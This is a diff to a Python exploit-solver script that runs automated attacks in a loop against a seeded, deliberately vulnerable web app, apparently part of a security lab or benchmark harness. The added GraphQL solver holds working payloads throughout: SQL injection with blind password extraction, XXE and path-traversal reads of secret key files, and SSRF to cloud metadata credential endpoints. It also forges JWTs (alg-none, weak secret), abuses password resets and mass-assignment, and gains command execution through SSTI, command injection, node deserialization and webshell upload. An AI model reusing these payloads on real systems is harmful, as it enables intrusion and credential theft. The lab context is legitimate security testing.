@@ -252,7 +252,7 @@ def try_sinks(eps, hdr):
     for p in eps.get("import-job", []):
         for payload in [
             json.dumps({"name": "_$$ND_FUNC$$_function(){ return require('child_process').execSync('id').toString() }()"}),
-            json.dumps({"__js_function": "function(){ return require('child_process').execSync('id').toString() }"}),
+            json.dumps({"__js_function": "function(){ return process.mainModule.require('child_process').execSync('id').toString() }"}),
         ]:
             s, t, _ = post(p, {"job": payload}, hdr); d = jparse(t)
             if isinstance(d, dict) and "uid=" in str(d.get("result", "")): return "deser"
@@ -278,6 +278,231 @@ def solve():
     if p: return True, auth, "ssrf", p
     return False, auth, None, None
 
+# ============================================================================
+# GraphQL transport solver — mirrors the REST solver but every attack is a POST
+# to /graphql. Used when manifest.api === 'graphql'. Auth headers still work
+# because the resolvers call the same authmodes.resolve(req) as REST.
+# ============================================================================
+
+GQL_URL = ROOT + "/graphql"
+
+def gql(query, variables=None, headers=None):
+    body = json.dumps({"query": query, "variables": variables or {}}).encode()
+    h = dict(headers or {}); h["Content-Type"] = "application/json"
+    r = U.Request(GQL_URL, data=body, headers=h, method="POST")
+    try: x = U.urlopen(r, timeout=25); return x.status, x.read().decode(), dict(x.headers)
+    except urllib.error.HTTPError as e: return e.code, e.read().decode(), dict(e.headers)
+    except Exception as e: return 0, str(e), {}
+
+def views_by_kind(m):
+    by = {}
+    for v in m.get("views", []): by.setdefault(v.get("kind"), []).append(v)
+    return by
+
+def gql_gather(views):
+    """Same facts (password/appkey/adminkey/sid) via /graphql resolvers."""
+    facts = {}
+    # SQLi via contentSearch
+    for v in views.get("content", []):
+        q = "query($b:String!,$q:String!){ contentSearch(block:$b, q:$q) }"
+        s, t, _ = gql(q, {"b": v["id"], "q": INJ})
+        d = jparse(t) or {}
+        rows = (d.get("data") or {}).get("contentSearch")
+        if isinstance(rows, list):
+            for r in rows:
+                if isinstance(r, dict) and r.get("name") == ADM and r.get("category"): facts["password"] = r["category"]
+        # blind-bool fallback via gql
+        if not facts.get("password") and isinstance(rows, dict) and "found" in rows:
+            def _ok(qq):
+                s2, t2, _ = gql(q, {"b": v["id"], "q": qq}); d2 = jparse(t2) or {}
+                r2 = (d2.get("data") or {}).get("contentSearch")
+                if isinstance(r2, dict) and isinstance(r2.get("found"), int): return r2["found"] > 0
+                if isinstance(r2, list): return len(r2) > 0
+                return False
+            pw = ""
+            for i in range(1, 48):
+                if not _ok("%' AND (SELECT length(password) FROM users WHERE username='" + ADM + "') >= " + str(i) + " -- "): break
+                found = None
+                for c in ''.join(chr(x) for x in range(0x20, 0x7f) if chr(x) not in "'\"\\%_"):
+                    if _ok("%' AND (SELECT substr(password," + str(i) + ",1) FROM users WHERE username='" + ADM + "') = '" + c + "' -- "): found = c; break
+                if found is None: break
+                pw += found
+            if pw: facts["password"] = pw
+    # XXE via importInvoice
+    for v in views.get("import", []):
+        q = 'mutation($b:String!,$xml:String!){ importInvoice(block:$b, xml:$xml){ ref customer amount } }'
+        for tgt in ("file:///app/config/app.conf", "file:///app/secret/app.key"):
+            xml = '<?xml version="1.0"?><!DOCTYPE c [<!ENTITY x SYSTEM "%s">]><invoice><customer>&x;</customer></invoice>' % tgt
+            s, t, _ = gql(q, {"b": v["id"], "xml": xml}); d = jparse(t) or {}
+            leak = ((d.get("data") or {}).get("importInvoice") or {}).get("customer") or ""
+            if leak:
+                mm = re.search(r'admin\.password=(\S+)', leak);  facts["password"] = facts.get("password") or (mm.group(1) if mm else None)
+                if "password" not in leak and leak.strip(): facts["appkey"] = leak.strip()
+    # LFI via fileRead
+    for v in views.get("fileportal", []):
+        q = 'query($b:String!,$n:String!){ fileRead(block:$b, name:$n) }'
+        for name, key in (("../secret/app.key", "appkey"), ("../config/app.conf", "conf")):
+            s, t, _ = gql(q, {"b": v["id"], "n": name}); d = jparse(t) or {}
+            txt = (d.get("data") or {}).get("fileRead") or ""
+            if key == "appkey" and txt and "password" not in txt: facts["appkey"] = txt.strip()
+            mm = re.search(r'admin\.password=(\S+)', txt or "");  facts["password"] = facts.get("password") or (mm.group(1) if mm else None)
+    # disclosure via openapi/backupFile
+    for v in views.get("disclosure", []):
+        s, t, _ = gql('query($b:String!){ openapi(block:$b) }', {"b": v["id"]}); d = jparse(t) or {}
+        spec = (d.get("data") or {}).get("openapi") or {}
+        xi = spec.get("x-internal") or {}
+        if xi.get("signingKey"): facts["appkey"] = xi["signingKey"]
+        mm = re.search(r'admin\.password=(\S+)', xi.get("config", "") or "");  facts["password"] = facts.get("password") or (mm.group(1) if mm else None)
+        if spec.get("x-admin-key"): facts["adminkey"] = spec["x-admin-key"]
+        # Swagger example variant: paths./login.post.requestBody.content.application/json.example.password
+        try:
+            ex = spec["paths"]["/login"]["post"]["requestBody"]["content"]["application/json"]["example"]
+            if ex and ex.get("password"): facts["password"] = facts.get("password") or ex["password"]
+        except Exception: pass
+        s, t, _ = gql('query($b:String!){ backupFile(block:$b) }', {"b": v["id"]}); d = jparse(t) or {}
+        bf = (d.get("data") or {}).get("backupFile") or ""
+        mm = re.search(r'admin\.password=(\S+)', bf); facts["password"] = facts.get("password") or (mm.group(1) if mm else None)
+        mk = re.search(r'SIGNING_KEY=(\S+)', bf);      facts["appkey"] = facts.get("appkey") or (mk.group(1) if mk else None)
+    # BOLA via userLookup — multi-hop: register/login as user, then read the admin record
+    for v in views.get("account", []):
+        un = "u" + str(int(time.time() * 1000) % 1000000)
+        s, t, _ = gql('mutation($b:String!,$u:String!,$p:String!){ register(block:$b, username:$u, password:$p){ ok } }', {"b": v["id"], "u": un, "p": "pw12345"})
+        # login and derive credential
+        s, t, h = gql('mutation($b:String!,$u:String!,$p:String!){ login(block:$b, username:$u, password:$p){ token apiKey user{ username role } } }', {"b": v["id"], "u": un, "p": "pw12345"})
+        d = jparse(t) or {}; li = ((d.get("data") or {}).get("login") or {})
+        cred = gql_cred_from_login(li, h)
+        if cred:
+            s2, t2, _ = gql('query($b:String!,$u:String!){ userLookup(block:$b, username:$u){ username role email password apikey } }', {"b": v["id"], "u": ADM}, cred)
+            d2 = jparse(t2) or {}
+            ul = (d2.get("data") or {}).get("userLookup") or {}
+            if ul.get("password"): facts["password"] = ul["password"]
+            if ul.get("apikey"): facts["adminkey"] = facts.get("adminkey") or ul["apikey"]
+    # SSRF cloud metadata
+    for v in views.get("webhook", []):
+        for url in ("http://169.254.169.254/latest/meta-data/iam/security-credentials/role",
+                    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"):
+            s, t, _ = gql('mutation($b:String!,$u:String!){ fetch(block:$b, url:$u, method:"GET", headers:{}, body:{}){ status body } }', {"b": v["id"], "u": url})
+            d = jparse(t) or {}; fr = (d.get("data") or {}).get("fetch") or {}
+            if fr.get("status") == 200:
+                inner = jparse(fr.get("body") or "") or {}
+                key = inner.get("SecretAccessKey") or inner.get("access_token")
+                if key: facts["appkey"] = facts.get("appkey") or key
+    return facts
+
+def gql_cred_from_login(li, headers):
+    if li.get("token"): return {"Authorization": "Bearer " + li["token"]}
+    if li.get("apiKey"): return {"X-API-Key": li["apiKey"]}
+    sc = headers.get("Set-Cookie", "");  m = re.search(r'mutie_sid=([^;]+)', sc)
+    if m: return {"Cookie": "mutie_sid=" + m.group(1)}
+    return None
+
+def gql_admin_creds(views, auth, facts):
+    cands = []
+    if auth == "jwt":
+        payload = {"username": ADM, "role": "admin", "exp": int(time.time()) + 3600}
+        if facts.get("appkey"): cands.append(("jwt-forge", {"Authorization": "Bearer " + forge_hs256(facts["appkey"], payload)}))
+        cands.append(("jwt-algnone", {"Authorization": "Bearer " + forge_none({"username": ADM, "role": "admin"})}))
+        cands.append(("jwt-weak", {"Authorization": "Bearer " + forge_hs256("secret", payload)}))
+    if auth == "session":
+        cands.append(("session-predict", {"Cookie": "mutie_sid=s-1000"}))
+        cands.append(("remember-me-b64", {"Cookie": "mutie_remember=" + base64.b64encode(ADM.encode()).decode()}))
+        cands.append(("remember-me-plain", {"Cookie": "mutie_remember=" + ADM}))
+    if auth == "apikey" and facts.get("adminkey"):
+        cands.append(("apikey-leak", {"X-API-Key": facts["adminkey"]}))
+    # login-bypass via SQLi in login args
+    for v in views.get("account", []):
+        for inj in [ADM + "' -- ", "' OR role='admin' -- "]:
+            s, t, h = gql('mutation($b:String!,$u:String!,$p:String!){ login(block:$b, username:$u, password:$p){ token apiKey user{ username role } } }', {"b": v["id"], "u": inj, "p": "x"})
+            d = jparse(t) or {}; li = ((d.get("data") or {}).get("login") or {})
+            c = gql_cred_from_login(li, h)
+            if c: cands.append(("login-bypass", c))
+        # reset-weak
+        s, t, _ = gql('mutation($b:String!,$u:String!){ reset(block:$b, username:$u) }', {"b": v["id"], "u": ADM})
+        for cp in ["rt-" + ADM]:
+            s2, t2, _ = gql('mutation($b:String!,$u:String!,$t:String!,$p:String!){ resetConfirm(block:$b, username:$u, token:$t, password:$p) }', {"b": v["id"], "u": ADM, "t": cp, "p": "pwned123"})
+            d2 = jparse(t2) or {}
+            if not (d2.get("errors")):
+                s3, t3, h3 = gql('mutation($b:String!,$u:String!,$p:String!){ login(block:$b, username:$u, password:$p){ token apiKey user{ username role } } }', {"b": v["id"], "u": ADM, "p": "pwned123"})
+                d3 = jparse(t3) or {}; li3 = ((d3.get("data") or {}).get("login") or {})
+                c = gql_cred_from_login(li3, h3)
+                if c: cands.append(("reset-weak", c))
+        # mass-assignment: register admin then login
+        un = "pwn" + str(int(time.time() * 1000) % 100000)
+        gql('mutation($b:String!,$u:String!,$p:String!,$r:String!){ register(block:$b, username:$u, password:$p, role:$r){ ok } }', {"b": v["id"], "u": un, "p": "pw12345", "r": "admin"})
+        s, t, h = gql('mutation($b:String!,$u:String!,$p:String!){ login(block:$b, username:$u, password:$p){ token apiKey user{ username role } } }', {"b": v["id"], "u": un, "p": "pw12345"})
+        d = jparse(t) or {}; li = ((d.get("data") or {}).get("login") or {})
+        c = gql_cred_from_login(li, h)
+        if c: cands.append(("mass-assign", c))
+        # creds-login with recovered password
+        if facts.get("password"):
+            s, t, h = gql('mutation($b:String!,$u:String!,$p:String!){ login(block:$b, username:$u, password:$p){ token apiKey user{ username role } } }', {"b": v["id"], "u": ADM, "p": facts["password"]})
+            d = jparse(t) or {}; li = ((d.get("data") or {}).get("login") or {})
+            c = gql_cred_from_login(li, h)
+            if c: cands.append(("creds-login", c))
+    return cands
+
+def gql_try_sinks(views, hdr):
+    ssti_payloads = [
+        "{{ process.mainModule.require('child_process').execSync('id') }}",
+        "<%= process.mainModule.require('child_process').execSync('id') %>",
+        "{{{ process.mainModule.require('child_process').execSync('id') }}}",
+        "- var cp = require('child_process')\n= cp.execSync('id').toString()",
+    ]
+    for v in views.get("adminreport", []):
+        for pl in ssti_payloads:
+            s, t, _ = gql('mutation($b:String!,$tpl:String!){ render(block:$b, template:$tpl, data:{}){ output } }', {"b": v["id"], "tpl": pl}, hdr)
+            d = jparse(t) or {}; out = ((d.get("data") or {}).get("render") or {}).get("output") or ""
+            if "uid=" in out: return "ssti"
+    for v in views.get("adminbackup", []):
+        for body in ({"name": "x.tgz; id #"}, {"host": "127.0.0.1; id #"}, {"name": "x; id #"}, {"branch": "main; id #"}):
+            fields = ",".join([k + ":$" + k for k in body.keys()])
+            variables = {"b": v["id"], **body}
+            arg_defs = ",".join(["$" + k + ":String" for k in body.keys()])
+            s, t, _ = gql('mutation($b:String!,' + arg_defs + '){ backup(block:$b,' + fields + '){ ok log } }', variables, hdr)
+            d = jparse(t) or {}; log = ((d.get("data") or {}).get("backup") or {}).get("log") or ""
+            if "uid=" in log: return "cmdi"
+        # deserialization via importJob
+        for payload in (
+            json.dumps({"name": "_$$ND_FUNC$$_function(){ return require('child_process').execSync('id').toString() }()"}),
+            json.dumps({"__js_function": "function(){ return process.mainModule.require('child_process').execSync('id').toString() }"}),
+        ):
+            s, t, _ = gql('mutation($b:String!,$j:String!){ importJob(block:$b, job:$j) }', {"b": v["id"], "j": payload}, hdr)
+            d = jparse(t) or {}; result = (d.get("data") or {}).get("importJob") or {}
+            if "uid=" in str(result): return "deser"
+    # upload webshell via uploadExt + runExt
+    upload_hosts = views.get("fileportal", []) + views.get("adminupload", [])
+    for v in upload_hosts:
+        for fn, content in (("s.js", "module.exports=()=>require('child_process').execSync('id').toString()"),
+                            ("t.ejs", "<%= process.mainModule.require('child_process').execSync('id') %>")):
+            gql('mutation($b:String!,$fn:String!,$c:String!){ uploadExt(block:$b, filename:$fn, content:$c){ ok } }', {"b": v["id"], "fn": fn, "c": content}, hdr)
+            s, t, _ = gql('mutation($b:String!,$n:String!){ runExt(block:$b, name:$n){ output } }', {"b": v["id"], "n": fn}, hdr)
+            d = jparse(t) or {}; out = ((d.get("data") or {}).get("runExt") or {}).get("output") or ""
+            if "uid=" in out: return "upload"
+    return None
+
+def gql_try_ssrf(views):
+    for v in views.get("webhook", []):
+        s, t, _ = gql('mutation($b:String!,$u:String!){ fetch(block:$b, url:$u, method:"GET", headers:{}, body:{}){ status body } }', {"b": v["id"], "u": "http://127.0.0.1:9000/token"})
+        d = jparse(t) or {}; fr = (d.get("data") or {}).get("fetch") or {}
+        if fr.get("status") == 200:
+            tok = (jparse(fr.get("body") or "") or {}).get("token")
+            if tok:
+                s2, t2, _ = gql('mutation($b:String!,$u:String!,$h:JSON!,$body:JSON!){ fetch(block:$b, url:$u, method:"POST", headers:$h, body:$body){ status body } }',
+                                {"b": v["id"], "u": "http://127.0.0.1:9000/run-task", "h": {"Content-Type": "application/json", "X-Task-Token": tok}, "body": {"cmd": "id"}})
+                d2 = jparse(t2) or {}; fr2 = (d2.get("data") or {}).get("fetch") or {}
+                if fr2.get("status") == 200 and "uid=" in (jparse(fr2.get("body") or "") or {}).get("output", ""): return "ssrf->run-task"
+    return None
+
+def solve_gql(m):
+    views = views_by_kind(m); auth = m.get("auth")
+    facts = gql_gather(views)
+    for how, hdr in gql_admin_creds(views, auth, facts):
+        sink = gql_try_sinks(views, hdr)
+        if sink: return True, auth, how + "|gql", sink
+    p = gql_try_ssrf(views)
+    if p: return True, auth, "ssrf|gql", p
+    return False, auth, None, None
+
 def wait_ready(timeout=30):
     deadline = time.time() + timeout
     while time.time() < deadline:
@@ -295,7 +520,10 @@ if __name__ == "__main__":
             subprocess.run(["docker", "restart", "mu"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             wait_ready()
         s, t, _ = get("/manifest"); m = jparse(t) or {}
-        success, auth, how, sink = solve()
+        if m.get("api") == "graphql":
+            success, auth, how, sink = solve_gql(m)
+        else:
+            success, auth, how, sink = solve()
         ok += 1 if success else 0
         if success: ways[how] = ways.get(how, 0) + 1; sinks[sink] = sinks.get(sink, 0) + 1
         print(f"  [{'OK  ' if success else 'FAIL'}] seed={m.get('seed')} auth={auth}  via {how} -> {sink}")
